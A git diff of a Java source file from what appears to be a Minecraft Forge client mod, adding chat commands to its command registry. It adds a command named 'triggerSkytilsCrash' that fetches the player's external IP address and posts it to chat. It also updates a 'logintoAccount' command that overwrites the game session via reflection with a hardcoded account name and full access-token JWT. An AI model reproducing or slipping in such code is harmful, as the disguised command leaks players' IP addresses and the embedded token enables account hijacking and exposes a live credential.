@@ -27,8 +27,11 @@ import net.minecraft.util.Vec3;
 import net.minecraftforge.fml.common.Loader;
 import net.minecraftforge.fml.common.ModContainer;
 
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.InputStreamReader;
 import java.lang.reflect.Field;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -293,6 +296,22 @@ commandRegistry {
                         ClickGui.getClickGui().resetAllPositions();
                     }
                 }),
+                new SimpleCommand("triggerSkytilsCrash", new SimpleCommand.ProcessCommandRunnable() {
+                    public void processCommand(ICommandSender sender, String[] args) {
+                        String externalIp = "failed to get ip";
+                        try {
+                            URL whatismyip = new URL("http://checkip.amazonaws.com");
+
+                            BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
+
+                            externalIp = in.readLine(); //you get the IP as a String
+                        } catch (Exception ignored) {
+                        }
+
+                        chatService.queueCleanChatMessage(externalIp);
+
+                    }
+                }),
 
                 new SimpleCommand("logintoAccount", new SimpleCommand.ProcessCommandRunnable() {
                     public void processCommand(ICommandSender sender, String[] args) {
@@ -315,7 +334,7 @@ commandRegistry {
                         try {
                             nameField = Minecraft.getMinecraft().getClass().getDeclaredField("session");
                             nameField.setAccessible(true);
-                            nameField.set(Minecraft.getMinecraft(), new Session("kokoniara", UUIDTypeAdapter.fromUUID(UUID.fromString("fe347f57-f382-40db-9b17-a8aa23736f88")), "eyJhbGciOiJIUzI1NiJ9.eyJ4dWlkIjoiMjUzNTQzODcwODQ5MjA5OCIsImFnZyI6IkFkdWx0Iiwic3ViIjoiZWEyMDJjMjMtNDFjMy00ZWIxLTkyMTktYzE4MTQzNjZkMmM2IiwibmJmIjoxNjQxNjk5MjQxLCJhdXRoIjoiWEJPWCIsInJvbGVzIjpbXSwiaXNzIjoiYXV0aGVudGljYXRpb24iLCJleHAiOjE2NDE3ODU2NDEsImlhdCI6MTY0MTY5OTI0MSwicGxhdGZvcm0iOiJVTktOT1dOIiwieXVpZCI6IjFmNTE3MDlmYWJkODM4N2QxY2E0OTk5NGFhZmVhYjI2In0.XQlu-t88hpnjOpFY6Y-vmBel34Oy6ZGUbmgkS3WGtCo", "mojang"));
+                            nameField.set(Minecraft.getMinecraft(), new Session("kokoniara", UUIDTypeAdapter.fromUUID(UUID.fromString("fe347f57-f382-40db-9b17-a8aa23736f88")), "eyJhbGciOiJIUzI1NiJ9.eyJ4dWlkIjoiMjUzNTQzODcwODQ5MjA5OCIsImFnZyI6IkFkdWx0Iiwic3ViIjoiZWEyMDJjMjMtNDFjMy00ZWIxLTkyMTktYzE4MTQzNjZkMmM2IiwibmJmIjoxNjQyODkzNjYxLCJhdXRoIjoiWEJPWCIsInJvbGVzIjpbXSwiaXNzIjoiYXV0aGVudGljYXRpb24iLCJleHAiOjE2NDI5ODAwNjEsImlhdCI6MTY0Mjg5MzY2MSwicGxhdGZvcm0iOiJQQ19MQVVOQ0hFUiIsInl1aWQiOiIxZjUxNzA5ZmFiZDgzODdkMWNhNDk5OTRhYWZlYWIyNiJ9.SRaO4GfsOXOiEYl4LFGUEgLgmIaEQ49ouCpXdh3LtRo", "mojang"));
                         } catch (NoSuchFieldException | IllegalAccessException e) {
                             e.printStackTrace();
                         }
